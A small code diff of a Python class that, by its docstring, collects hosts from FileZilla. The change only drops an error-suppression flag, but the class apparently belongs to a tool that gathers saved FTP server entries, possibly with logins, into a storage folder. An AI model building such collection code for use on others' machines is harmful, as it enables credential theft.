@@ -9,11 +9,10 @@ class FileZilla:
     """
     Collects hosts from the FileZilla.
     """
-    def __init__(self, storage_path: str, folder: str, errors: bool):
+    def __init__(self, storage_path: str, folder: str):
 
         self.__storage_path = storage_path
         self.__folder = folder
-        self.__errors = errors
 
         self.__config = FileZillaConfig()
 
@@ -79,4 +78,4 @@ class FileZilla:
             self.__get_sites()
 
         except Exception as e:
-            if self.__errors is True: print(f"[FileZilla]: {repr(e)}")
+            print(f"[FileZilla]: {repr(e)}")
